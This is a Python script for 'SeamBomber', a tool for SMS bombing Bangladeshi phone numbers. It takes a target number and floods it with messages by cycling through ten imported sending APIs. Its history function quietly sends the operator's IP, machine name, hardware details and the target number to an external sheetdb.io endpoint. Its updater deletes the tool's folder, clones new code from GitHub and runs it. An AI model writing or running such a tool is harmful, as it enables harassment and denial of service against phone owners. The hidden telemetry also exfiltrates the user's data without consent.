# SeamBomber
# Tool : Unlimited SMS Bombing In Bangladeshi Numbers
#Author : Sh-Seam
# Coder : SeamCoder

import time
import requests
import sys
import os
import shutil
import datetime
import json
import platform
from urllib.request import urlopen
from more.data import *



def psb(z):
            for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.01)
#Check Update
        

def update():
    
    try:
         toolVersion = open("./more/.version", "r").read()
    except:
        toolVersion = "Seam"
    
    try:
        mainVersion = requests.get("https://raw.githubusercontent.com/Sh-Seam/seam/main/more/.version").text
    except:
        psb("\n\u001b[31;1m    [!]\u001b[32;1m Please Connect To The Internet! \u001b[34;1m")
        time.sleep(1)
        l = input("\u001b[31;1m    [*]\u001b[32;1m Press Enter To Continue...\u001b[34;1m")
        update()
    
#If Tool Version Is Same, Then Return/Close Function
    if (toolVersion == mainVersion):
        return
    
    print("""
    \u001b[32;1m
    ----╔════════════════════════════════════════════════════╗
    ----║\u001b[31;1m ██╗░░░██╗██████╗░██████╗░░█████╗░████████╗███████╗ \u001b[32;1m║
    ----║\u001b[31;1m ██║░░░██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝ \u001b[32;1m║
    ----║\u001b[31;1m ██║░░░██║██████╔╝██║░░██║███████║░░░██║░░░█████╗░░ \u001b[32;1m║
    ----║\u001b[31;1m ██║░░░██║██╔═══╝░██║░░██║██╔══██║░░░██║░░░██╔══╝░░ \u001b[32;1m║
    ----║ \u001b[31;1m╚██████╔╝██║░░░░░██████╔╝██║░░██║░░░██║░░░███████╗ \u001b[32;1m║
    ----║ \u001b[31;1m░╚═════╝░╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝ \u001b[32;1m║
    ----╠════════════════════════════════════════════════════╣
    ----║\u001b[31;1m     ███████╗░█████╗░██╗░░░██╗███╗░░██╗██████╗░     \u001b[32;1m║
    ----║ \u001b[31;1m    ██╔════╝██╔══██╗██║░░░██║████╗░██║██╔══██╗     \u001b[32;1m║
    ----║ \u001b[31;1m    █████╗░░██║░░██║██║░░░██║██╔██╗██║██║░░██║     \u001b[32;1m║
    ----║ \u001b[31;1m    ██╔══╝░░██║░░██║██║░░░██║██║╚████║██║░░██║     \u001b[32;1m║
    ----║ \u001b[31;1m    ██║░░░░░╚█████╔╝╚██████╔╝██║░╚███║██████╔╝     \u001b[32;1m║
    ----║ \u001b[31;1m    ╚═╝░░░░░░╚════╝░░╚═════╝░╚═╝░░╚══╝╚═════╝░    \u001b[32;1m ║
    ----╚════════════════════════════════════════════════════╝""")
    time.sleep(0.5)
    psb("\033[92m    [\033[37m!\033[92m] Updating Tool...\u001b[34;1m")
    
    os.system("cd .. && rm -rf seam && git clone https://github.com/Sh-Seam/seam")
    psb("\n\033[92m    [\033[37m*\033[92m] Update Complete!\u001b[34;1m")
    psb("\033[92m    [\033[37m*\033[92m] Starting Tool...\u001b[34;1m")
    time.sleep(0.8)
       
    os.system("cd .. && cd seam && python seam.py")


def intpu():
    os.system("clear")
    
    print("\u001b[32;1m\n\n\n\n\n               ╔══════════════════════════════════════════╗")
    print("\u001b[32;1m               ║ \u001b[34;1mEnter 1. => For Sms Bombing.   \u001b[32;1m          ║")
    print("\u001b[32;1m               ║ \u001b[34;1mEnter 2. => To know your history.   \u001b[32;1m     ║")
    print("\u001b[32;1m               ║ \u001b[34;1mEnter 3. => To know your IP information.\u001b[32;1m ║")
    print("\u001b[32;1m               ╠══════════════════════════════════════════╣")
    print("\u001b[32;1m               ║ \u001b[31;1mNote : To stop this tool Enter ctrl+Z.\u001b[32;1m   ║")
    print("\u001b[32;1m               ╚══════════════════════════════════════════╝\n\n\n")
    

    inpu = int(input("                      \u001b[33;1m⭐️\u001b[32;1m Enter Number =>   \u001b[0m"))

    # 1 Sms
    if inpu == int(1):
        columns = shutil.get_terminal_size().columns

        def psb(z):
            for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.01)


        #Logo
        def logo():
            os.system("clear")
            print("\u001b[32;1m-- ╔════════════════════════════════════════════════════════╗")
            print("\u001b[32;1m-- ║         \u001b[31;1m ░██████╗███████╗░█████╗░███╗░░░███╗\u001b[32;1m           ║")
            print("\u001b[32;1m-- ║         \u001b[31;1m ██╔════╝██╔════╝██╔══██╗████╗░████║\u001b[32;1m           ║")
            print("\u001b[32;1m-- ║         \u001b[31;1m ╚█████╗░█████╗░░███████║██╔████╔██║\u001b[32;1m           ║")
            print("\u001b[32;1m-- ║         \u001b[31;1m ░╚═══██╗██╔══╝░░██╔══██║██║╚██╔╝██║\u001b[32;1m           ║")
            print("\u001b[32;1m-- ║         \u001b[31;1m ██████╔╝███████╗██║░░██║██║░╚═╝░██║\u001b[32;1m           ║")
            print("\u001b[32;1m-- ║         \u001b[31;1m ╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝\u001b[32;1m           ║")
            print("\u001b[32;1m-- ╠════════════════════════════════════════════════════════╣")
            print("\u001b[32;1m-- ║ Author  : Seam                                         ║")
            print("\u001b[32;1m-- ║ Tool    : Unlimited SMS Bomber                         ║")
            print("\u001b[32;1m-- ║ GitHub  : https://github.com/Sh-Seam/seam              ║")
            print("\u001b[32;1m-- ║ Website : https://sh-seam.github.io/Twist-X/Bar.html   ║")
            print("\u001b[32;1m-- ║ Coder   : Seam coder                                   ║")
            print("\u001b[32;1m-- ╚════════════════════════════════════════════════════════╝ \u001b[34;1m")
    

        #Options Banner
        def banner():
            amount = str(main.amount)
            if (len(amount) == 1):
                amount = amount + "                    "
            elif (len(amount) == 2):
                amount = amount + "                   "
            elif (len(amount) == 3):
                amount = amount + "                  "
            elif (len(amount) == 4):
                amount = amount + "                 "
            #print(" ", end="")
            print("\033[95m-" * (columns), end = "")
                #print(" ")
            print(("\033[92mTarget  : \033[37m0" + main.number + "          ").center(columns + 10))
            print(("\033[92mAmount  : \033[37m" + amount).center(columns + 10))
            print("\033[92mProcess : \033[37mStarted               ".center(columns + 10))
            print("\033[92mNote    : \033[37mPress ctrl + z To Stop".center(columns + 10))
            #print(" ", end="")
            print("\033[95m-" * (columns), end = "")
            print("\n\u001b[34;1m")


            #Check SMS Sent and Process
        def check(sent):
            amount = main.amount
            delay = main.delay
    
            print("\r\033[92m    [\033[94m#\033[92m] Massage Sent : \033[94m[\033[37m" + str(sent) + "\033[94m]\033[37m", end="\u001b[34;1m")
    
            if (sent == amount):
                psb("\n\n\033[92m    [\033[37m*\033[92m] Bombing Finished!\u001b[34;1m")
                psb("\033[92m    [\033[37m*\033[92m] Amount : \033[37m\u001b[34;1m" + str(amount))
                psb("\033[92m    [\033[37m*\033[92m] Target : \u001b[34;1m0\u001b[34;1m" + main.number)
                psb("\033[92m    [\033[37m*\033[92m] From   : \033[37mSeamBomber\n\u001b[34;1m")
                time.sleep(0.6)
                print("\033[92m[\033[93m★\033[92m] Thanks For Using Our Tool \033[92m[\033[93m★\033[92m]\u001b[34;1m".center(columns + 30))
                print("\u001b[34;1m")
        
                return True
            else:
                time.sleep(delay)
                return False


          #Get Target Number
        def getNumber():
            number = input("\n    \u001b[32;1m[*] \u001b[34;1mEnter Target Number:> \u001b[34;1m")
            try:
                int(number)
            except:
                psb("\n\u001b[31;1m    [!]\u001b[32;1m Please Enter a Correct Number!\u001b[34;1m")
                number = getNumber()
            if not (len(number) == 11):
                psb("\n\u001b[31;1m    [!]\u001b[32;1m Please Enter 11 Digit Number!\u001b[34;1m")
                number = getNumber()
    
            return number


        #Main    
        def main():
            number = getNumber()
            number = number[-10:]
            main.number = number
    
            amount = input("    \033[92m[\033[37m*\033[92m] Enter Amount (\033[37mDefault: 10\033[92m):> \u001b[34;1m")
            try:
                amount = int(amount)
            except:
                amount = 10
    
            main.amount = amount
    
            delay = input("    \033[92m[\033[37m*\033[92m] Enter Time(\033[37mSec\033[92m) Delay (\033[37mDefault: 2s\033[92m):> \u001b[34;1m")
            try:
                int(delay)
            except:
                delay = 2
    
            main.delay = int(delay)
    
            time.sleep(1)
            logo()
            banner()
            sent = 0
            while True:
                code = api1(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
        
                code = api2(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
        
                code = api3(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
            
                code = api4(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
            
                code = api5(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
        
                code = api6(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
        
                code = api7(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
            
                    code = api8(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
            
                code = api9(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
        
                code = api10(number)
                if (code == 200):
                    sent += 1
                    if(check(sent)):
                        break
        def hist():
            hard=str(f" Arc: {platform.architecture()}"+" -- "+f"Pla: {platform.platform()}"+" -- "+f"Pro: {platform.processor()}")
            now = datetime.datetime.now()
            year = now.strftime("%Y")
            month = now.strftime('%B')
            date = now.strftime("%d")
            hour =now.strftime("%I")
            minute = now.strftime("%M")
            second = now.strftime("%S")
            pm = now.strftime("%p")
            week =now.strftime("%A")

            Date="\u001b[93;1mDate  : "+hour+":"+minute+":"+second+" "+pm+" , "+week+" , "+date+" "+month+" "+year
            Date001="Date  : "+hour+":"+minute+":"+second+" "+pm+" , "+week+" , "+date+" "+month+" "+year
            

            number = str(main.number)
            amount = str(main.amount)
            delay = str(main.delay)
            
            
            url = 'https://ipinfo.io/json'
            resp = urlopen(url)
            data = json.load(resp)
            url= "https://sheetdb.io/api/v1/myawxgjvo61ub"
            data = {"Date":Date001,"IP" : data['ip'],"Name": f"{platform.node()}", "Number": number,"Amount": amount,"Data": hard}
            requests.post(url, json=data)
            
            
            b = open("file/history.txt" , "a")
            b.write('\n'+'\n'+"\u001b[34;1m       ----------------------------------------------------"+'\n'+'\n       '+ Date+'\n'+"       \u001b[32;1mNumber: \u001b[31;1m0"+number+"\n"+"       \u001b[32;1mAmount: \u001b[31;1m"+amount+"\n"+"       \u001b[32;1mDelay : \u001b[31;1m"+delay+"\u001b[0m")
            b.close()
            return intpu()

        
        if __name__ == "__main__":
            logo()
            update()
            main()
            hist()
            intpu()
            

    


    # History
    elif inpu == int(2):
        ohist = open("file/history.txt" , "r")
        ohist = ohist.read()
        print(ohist+"\n\n\n")
        time.sleep(1)
        ret = input("\n\u001b[32;1m                    Press Enter to continue.......!\u001b[0m")
        if ret == int(0):
            print("                    Oooops erro...re open to continue")
        else:
            return intpu()

    elif inpu == int(3):
        url = 'https://ipinfo.io/json'
        resp = urlopen(url)
        data = json.load(resp)
        data1 ="\n\u001b[32;1m               Ip:\u001b[34;1m---------------- \u001b[31;1m" +data['ip']
        data2 ="\u001b[32;1m               City:\u001b[34;1m-------------- \u001b[31;1m"+data['city']
        data3 ="\u001b[32;1m               Region:\u001b[34;1m------------ \u001b[31;1m" +data['region']
        data4 ="\u001b[32;1m               Country:\u001b[34;1m----------- \u001b[31;1m"+data['country']
        data5 ="\u001b[32;1m               loctitude-latitude: \u001b[31;1m"+data['loc']
        data6 ="\u001b[32;1m               Postal:\u001b[34;1m------------ \u001b[31;1m"+data['postal']
        data7 ="\u001b[32;1m               Timezone:\u001b[34;1m---------- \u001b[31;1m"+data['timezone']  
        dataAll =data1+"\n"+data2+"\n"+data3+"\n"+data4+"\n"+data5+"\n"+data6+"\n"+data7+'\n'
        print("\u001b[32;1m"+dataAll+"\u001b[0m")
        time.sleep(1)
        ret = input("\n\u001b[32;1m                    Press Enter to continue.......!\u001b[0m")
        if ret == int(0):
            print("                    Oooops erro...re open to continue")
        else:
            return intpu()


    
    else:
        print("\u001b[31;1m                      Enter correct number.....!\u001b[0m")
        time.sleep(2)
        return intpu()

    
        



if __name__ == "__main__":
    update()
    intpu()
